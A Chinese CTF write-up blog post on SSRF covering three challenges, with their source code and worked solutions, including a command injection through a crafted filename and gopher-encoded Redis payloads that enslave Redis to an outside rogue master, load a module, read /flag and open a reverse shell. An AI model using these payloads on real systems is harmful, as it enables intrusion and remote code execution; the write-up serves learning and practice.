@@ -1,0 +1,524 @@
+---
+layout: post
+title:  SSRF
+date:   2021-06-27 00:01:01 +0300
+image:  2021-06-27-kiss.jpg
+tags:   [ctf,web,ssrf]
+---
+
+SSRF(Server-Side Request Forgery:服务器端请求伪造) 是一种由攻击者构造形成由服务端发起请求的一个安全漏洞。一般情况下，SSRF攻击的目标是从外网无法访问的内部系统。（正是因为它是由服务端发起的，所以它能够请求到与它相连而与外网隔离的内部系统）
+
+SSRF 形成的原因大都是由于服务端提供了从其他服务器应用获取数据的功能且没有对目标地址做过滤与限制。比如从指定URL地址获取网页文本内容，加载指定地址的图片，下载等等。利用的是服务端的请求伪造。ssrf是利用存在缺陷的web应用作为代理攻击远程和本地的服务器。
+
+### [De1CTF 2019]SSRF Me
+
+打开网页，题目给了源码
+
+```assembly
+#! /usr/bin/env python 
+#encoding=utf-8
+from flask import Flask
+from flask import request
+import socket
+import hashlib
+import urllib
+import sys
+import os
+import json
+
+reload(sys)
+sys.setdefaultencoding('latin1')
+
+app = Flask(__name__)
+secert_key = os.urandom(16)
+
+class Task:
+    def __init__(self, action, param, sign, ip):
+        self.action = action
+        self.param = param
+        self.sign = sign
+        self.sandbox = md5(ip)
+        if(not os.path.exists(self.sandbox)):
+            #SandBox For Remote_Addr 
+            os.mkdir(self.sandbox)
+
+    def Exec(self):
+        result = {}
+        result['code'] = 500
+        if (self.checkSign()):
+            if "scan" in self.action:
+                tmpfile = open("./%s/result.txt" % self.sandbox, 'w')
+                resp = scan(self.param)
+                if (resp == "Connection Timeout"):
+                    result['data'] = resp
+                else:
+                    print(resp) 
+                    tmpfile.write(resp)
+                    tmpfile.close()
+                result['code'] = 200
+            if "read" in self.action:
+                f = open("./%s/result.txt" % self.sandbox, 'r')
+                result['code'] = 200
+                result['data'] = f.read()
+            if result['code'] == 500:
+                result['data'] = "Action Error"
+        else: 
+            result['code'] = 500
+            result['msg'] = "Sign Error"
+        return result
+    
+    def checkSign(self):
+        if (getSign(self.action, self.param) == self.sign):
+            return True 
+        else:
+            return False
+        #generate Sign For Action Scan.
+
+@app.route("/geneSign", methods=['GET', 'POST'])
+def geneSign():
+    param = urllib.unquote(request.args.get("param", ""))
+    action = "scan"
+    return getSign(action, param)
+    
+@app.route('/De1ta',methods=['GET','POST'])
+def challenge():
+    action = urllib.unquote(request.cookies.get("action"))
+    param = urllib.unquote(request.args.get("param", ""))
+    sign = urllib.unquote(request.cookies.get("sign"))
+    ip = request.remote_addr
+    if(waf(param)):
+        return "No Hacker!!!!"
+    task = Task(action, param, sign, ip)
+    return json.dumps(task.Exec())
+    
+@app.route('/')
+def index():
+        return open("code.txt","r").read()
+        
+def scan(param):
+    socket.setdefaulttimeout(1)
+    try:
+        return urllib.urlopen(param).read()[:50]
+    except:
+        return "Connection Timeout"
+        
+def getSign(action, param):
+    return hashlib.md5(secert_key + param + action).hexdigest()
+
+def md5(content):
+    return hashlib.md5(content).hexdigest()
+    
+def waf(param):
+    check=param.strip().lower()
+    if check.startswith("gopher") or check.startswith("file"):
+        return True
+    else:
+        return False
+
+if __name__ == '__main__':
+    app.debug = False
+    app.run(host='0.0.0.0',port=80)
+```
+
+hint
+
+`flag is in ./flag.txt`
+
+python的flask框架，三个路由
+
+index获取源码，geneSign调用了getSign方法生成 md5，
+
+De1ta获取了三个参数，其中两个是从cookie中获取的
+
+* 第一个参数action是传入read和scan的
+
+* 第二个参数传入一个文件名
+
+* 第三个参数sign是一个md5值。跟进Task中的Exec()方法，可以发现这里面还有个checkSign()，并且在这里面调用了getSign()方法，结果与sign进行比较。
+
+  仔细看看getSign()方法，发现有个secert_key我们是未知的
+
+看完代码之后就有了一定的了解，他的目的应该是要我们读取flag.txt中的内容
+第一个参数含有"scan"和"read"，第二个参数是"flag.txt"，第三个参数是md5(secret+param+"scan")，所以我们可以通过构造第二个参数为"flag.txtread"访问`geneSign`路由从而得到MD5值。
+
+`/geneSign?param=flag.txtread`
+
+225be21f62772dc688a44b8229853e3d
+
+访问`/De1ta?param=flag.txt`路由
+
+添加`Cookie:action=readscan;sign=225be21f62772dc688a44b8229853e3d;`
+
+得到flag
+
+{"code": 200, "data": "flag{25873340-08d0-4604-a6f2-0fc49fac369b}\n"}
+
+### [HITCON 2017]SSRFme
+
+打开网页，题目给了源码
+
+```assembly
+<?php
+if (isset($_SERVER['HTTP_X_FORWARDED_FOR'])) {
+$http_x_headers = explode(',', $_SERVER['HTTP_X_FORWARDED_FOR']);
+$_SERVER['REMOTE_ADDR'] = $http_x_headers[0];
+}
+
+echo $_SERVER["REMOTE_ADDR"];
+
+$sandbox = "sandbox/" . md5("orange" . $_SERVER["REMOTE_ADDR"]);
+@mkdir($sandbox);
+@chdir($sandbox);
+
+$data = shell_exec("GET " . escapeshellarg($_GET["url"]));
+$info = pathinfo($_GET["filename"]);
+$dir  = str_replace(".", "", basename($info["dirname"]));
+@mkdir($dir);
+@chdir($dir);
+@file_put_contents(basename($info["basename"]), $data);
+highlight_file(__FILE__);
+```
+
+**$_SERVER** 是 [PHP](http://c.biancheng.net/php/) 预定义变量之一，可以直接使用，它是一个包含了诸如头信息（header）、路径（path）及脚本位置（script locations）信息的数组。
+
+**explode(separator,string,limit)**
+
+把字符串打散为数组。
+
+**注释：**"*separator*" 参数不能是空字符串。
+
+**escapeshellarg(string `$arg`): string**
+
+**escapeshellarg()** 将给字符串增加一个单引号并且能引用或者转码任何已经存在的单引号，这样以确保能够直接将一个字符串传入 shell 函数，并且还是确保安全的。对于用户输入的部分参数就应该使用这个函数。shell 函数包含 [exec()](https://www.php.net/manual/zh/function.exec.php), [system()](https://www.php.net/manual/zh/function.system.php) [执行运算符](https://www.php.net/manual/zh/language.operators.execution.php) 。
+
+pathinfo() 函数以数组的形式返回关于文件路径的信息。
+
+返回的数组元素如下：
+
+- [dirname]: 目录路径
+
+- [basename]: 文件名
+
+- [extension]: 文件后缀名
+
+- [filename]: 不包含后缀的文件名
+
+basename() 函数返回路径中的文件名部分。
+
+**先创建一个目录sandbox/md5(orange+ip)，然后执行`GIT $_GET['url']`，然后会创建文件夹，并将执行`GIT $_GET['url']`后的结果放在该文件夹下面filename传过去的文件中。**
+
+##### `GET`是`Lib for WWW in Perl`中的命令 目的是模拟`http`的`GET`请求
+
+创建文件
+
+`?url=/&filename=aaa`
+
+访问创建的文件
+
+`/sandbox/be9e11f310b3d83b4abe463cd358a61c/aaa`
+
+得到目录↓↓↓
+
+## Directory listing of /
+
+- [./](file:///)
+- [../](file:///)
+- [.dockerenv](file:///.dockerenv)
+- [bin/](file:///bin/)
+- [boot/](file:///boot/)
+- [dev/](file:///dev/)
+- [etc/](file:///etc/)
+- [flag](file:///flag)
+- [home/](file:///home/)
+- [lib/](file:///lib/)
+- [lib64/](file:///lib64/)
+- [media/](file:///media/)
+- [mnt/](file:///mnt/)
+- [opt/](file:///opt/)
+- [proc/](file:///proc/)
+- [readflag](file:///readflag)
+- [root/](file:///root/)
+- [run/](file:///run/)
+- [sbin/](file:///sbin/)
+- [srv/](file:///srv/)
+- [start.sh](file:///start.sh)
+- [sys/](file:///sys/)
+- [tmp/](file:///tmp/)
+- [usr/](file:///usr/)
+- [var/](file:///var/)
+
+发现有readflag和flag，于是猜想执行readflag flag可以得到flag
+
+先新建一个名为“bash -c /readflag|”的文件，用于之后的命令执行
+
+`?url=&filename=bash -c /readflag|` 
+
+再利用GET执行bash -c /readflag保存到aaa文件
+
+`?url=file:bash -c /readflag|&filename=aaa`
+
+访问aaa文件
+
+`/sandbox/be9e11f310b3d83b4abe463cd358a61c/aaa`
+
+flag is flag{912ba7ad-e6ba-4719-9e49-7f689e3a0dab}
+
+### [网鼎杯 2020 玄武组]SSRFMe
+
+```assembly
+<?php
+function check_inner_ip($url)
+{
+    $match_result=preg_match('/^(http|https|gopher|dict)?:\/\/.*(\/)?.*$/',$url);
+    if (!$match_result)
+    {
+        die('url fomat error');
+    }
+    try
+    {
+        $url_parse=parse_url($url);
+    }
+    catch(Exception $e)
+    {
+        die('url fomat error');
+        return false;
+    }
+    $hostname=$url_parse['host'];
+    $ip=gethostbyname($hostname);
+    $int_ip=ip2long($ip);
+    return ip2long('127.0.0.0')>>24 == $int_ip>>24 || ip2long('10.0.0.0')>>24 == $int_ip>>24 || ip2long('172.16.0.0')>>20 == $int_ip>>20 || ip2long('192.168.0.0')>>16 == $int_ip>>16;
+}
+
+function safe_request_url($url)
+{
+
+    if (check_inner_ip($url))
+    {
+        echo $url.' is inner ip';
+    }
+    else
+    {
+        $ch = curl_init();
+        curl_setopt($ch, CURLOPT_URL, $url);
+        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+        curl_setopt($ch, CURLOPT_HEADER, 0);
+        $output = curl_exec($ch);
+        $result_info = curl_getinfo($ch);
+        if ($result_info['redirect_url'])
+        {
+            safe_request_url($result_info['redirect_url']);
+        }
+        curl_close($ch);
+        var_dump($output);
+    }
+
+}
+if(isset($_GET['url'])){
+    $url = $_GET['url'];
+    if(!empty($url)){
+        safe_request_url($url);
+    }
+}
+else{
+    highlight_file(__FILE__);
+}
+// Please visit hint.php locally.
+?>
+```
+
+* 接受用户传入的url,判断其不为空后经函数处理
+* check_inner_ip函数判断其是否为合法内网ip,并使用http或gopher等协议
+* safe_request_url先用上一个函数判断,不符合即会开启curl会话,输入值.
+
+#### curl_setopt
+
+(PHP 4 >= 4.0.2, PHP 5, PHP 7, PHP 8)
+
+curl_setopt — 设置 cURL 传输选项
+
+`curl_setopt(resource $ch, int $option, mixed $value): bool`
+
+为 cURL 会话句柄设置选项。
+
+- `handle`
+
+  由`curl_init()`返回的cURL句柄。
+
+- `option`
+
+  需要设置的`CURLOPT_XXX`选项。
+
+- `value`
+
+  将设置在`option`选项上的值。
+
+| 选项                         | 将 `value` 设置为                                            | 备注 |
+| :--------------------------- | :----------------------------------------------------------- | :--- |
+| **`CURLOPT_HEADER`**         | 启用时会将头文件的信息作为数据流输出。                       |      |
+| **`CURLOPT_RETURNTRANSFER`** | **`true`** 将[curl_exec()](https://www.php.net/manual/zh/function.curl-exec.php)获取的信息以字符串返回，而不是直接输出。 |      |
+
+看到curl_exec比较明确是ssrf了,代码最后提示要从本地端访问hint.php文件,绕过本地验证
+
+`?url=http://0.0.0.0/hint.php`
+
+得到
+
+```assembly
+string(1342) " <?php
+if($_SERVER['REMOTE_ADDR']==="127.0.0.1"){
+  highlight_file(__FILE__);
+}
+if(isset($_POST['file'])){
+  file_put_contents($_POST['file'],"<?php echo 'redispass is root';exit();".$_POST['file']);
+}
+"
+```
+
+看到redis，提示密码是root。
+
+主从复制，是指将一台Redis服务器的数据，复制到其他的Redis服务器。前者称为主节点(master)，后者称为从节点(slave)；数据的复制是单向的，只能由主节点到从节点。
+
+redis的持久化使得机器即使重启数据也不会丢失，因为redis服务器重启后会把硬盘上的文件重新恢复到内存中，但是如果硬盘的数据被删除的话数据就无法恢复了，如果通过主从复制就能解决这个问题，主redis的数据和从redis上的数据保持实时同步，当主redis写入数据是就会通过主从复制复制到其它从redis。
+
+使用两个工具
+
+https://github.com/xmsec/redis-ssrf
+
+https://github.com/n0b0dyCN/redis-rogue-server
+
+开启rogue-server.py用于伪装为主redis，不过这个启动过程一连上就容易断开，可以写个死循环shell脚本跑rogue-server.py，不然可能导致exp.so都没传完就中断了。
+
+run.sh
+
+```assembly
+while [ "1" = "1" ]
+do
+	python rogue-server.py
+done
+```
+
+redis在6379端口，可以验证
+
+`?url=dict://0.0.0.0:6379/`
+
+```assembly
+string(39) "-NOAUTH Authentication required. +OK "
+```
+
+
+
+```assembly
+root@93b3ca8f2d45:~/redis-ssrf-master# python3 ssrf-redis.py
+*2
+$4
+AUTH
+$4
+root
+*4
+$6
+CONFIG
+$3
+SET
+$3
+dir
+$5
+/tmp/
+*4
+$6
+config
+$3
+set
+$10
+dbfilename
+$6
+exp.so
+*3
+$7
+SLAVEOF
+$14
+172.16.160.159
+$4
+6666
+*2
+$11
+system.exec
+$14
+cat${IFS}/flag
+*1
+$4
+quit
+
+gopher://0.0.0.0:6379/_%2A2%0D%0A%244%0D%0AAUTH%0D%0A%244%0D%0Aroot%0D%0A%2A4%0D%0A%246%0D%0ACONFIG%0D%0A%243%0D%0ASET%0D%0A%243%0D%0Adir%0D%0A%245%0D%0A/tmp/%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%2410%0D%0Adbfilename%0D%0A%246%0D%0Aexp.so%0D%0A%2A3%0D%0A%247%0D%0ASLAVEOF%0D%0A%2414%0D%0A172.16.160.159%0D%0A%244%0D%0A6666%0D%0A%2A2%0D%0A%2411%0D%0Asystem.exec%0D%0A%2414%0D%0Acat%24%7BIFS%7D/flag%0D%0A%2A1%0D%0A%244%0D%0Aquit%0D%0A
+```
+
+`?url=gopher%3A%2F%2F0.0.0.0%3A6379%2F_%252A2%250D%250A%25244%250D%250AAUTH%250D%250A%25244%250D%250Aroot%250D%250A%252A4%250D%250A%25246%250D%250ACONFIG%250D%250A%25243%250D%250ASET%250D%250A%25243%250D%250Adir%250D%250A%25245%250D%250A%2Ftmp%2F%250D%250A%252A4%250D%250A%25246%250D%250Aconfig%250D%250A%25243%250D%250Aset%250D%250A%252410%250D%250Adbfilename%250D%250A%25246%250D%250Aexp.so%250D%250A%252A3%250D%250A%25247%250D%250ASLAVEOF%250D%250A%252414%250D%250A172.16.160.159%250D%250A%25244%250D%250A6666%250D%250A%252A2%250D%250A%252411%250D%250Asystem.exec%250D%250A%252414%250D%250Acat%2524%257BIFS%257D%2Fflag%250D%250A%252A1%250D%250A%25244%250D%250Aquit`
+
+得到
+
+string(107) "+OK +OK +OK +OK -ERR unknown command `system.exec`, with args beginning with: `cat${IFS}/flag`, +OK "
+
+
+
+```assembly
+root@93b3ca8f2d45:~/redis-ssrf-master# python3 ssrf-redis.py
+*2
+$4
+AUTH
+$4
+root
+*3
+$6
+MODULE
+$4
+LOAD
+$11
+/tmp/exp.so
+*2
+$11
+system.exec
+$14
+cat${IFS}/flag
+*1
+$4
+quit
+
+gopher://0.0.0.0:6379/_%2A2%0D%0A%244%0D%0AAUTH%0D%0A%244%0D%0Aroot%0D%0A%2A3%0D%0A%246%0D%0AMODULE%0D%0A%244%0D%0ALOAD%0D%0A%2411%0D%0A/tmp/exp.so%0D%0A%2A2%0D%0A%2411%0D%0Asystem.exec%0D%0A%2414%0D%0Acat%24%7BIFS%7D/flag%0D%0A%2A1%0D%0A%244%0D%0Aquit%0D%0A
+```
+
+
+
+```
+gopher://0.0.0.0:6379/_auth root
+config set dir /tmp/
+quit
+gopher://0.0.0.0:6379/_auth%2520root%250aconfig%2520set%2520dir%2520%252ftmp%252f%250aquit
+
+gopher://0.0.0.0:6379/_auth root
+config set dbfilename exp.so
+slaveof 172.16.162.140 21000
+quit
+gopher://0.0.0.0:6379/_auth%2520root%250Aconfig%2520set%2520dbfilename%2520exp.so%250Aslaveof%2520172.16.162.140%252021000%250Aquit
+
+gopher://0.0.0.0:6379/_auth%2520root%250Aconfig%2520module%2520dbload%2520./exp.so%250d%250Aquit
+gopher://0.0.0.0:6379/_auth%2520root%250Amodule%2520load%2520./exp.so%250Aquit
+
+gopher://0.0.0.0:6379/_auth root
+module load /tmp/exp.so
+system.rev 172.16.162.140 6663
+quit
+gopher://0.0.0.0:6379/_auth%2520root%250Amodule%2520load%2520%252Ftmp%252Fexp.so%250Asystem.rev%2520172.16.162.140%25206663%250Aquit
+```
+
+
+
+```assembly
+string(15) "+OK +OK +OK "
+```
+
+
+
+```assembly
+string(20) "+OK +OK +OK +OK "
+```
+
+搞了一下午没搞出来caonima
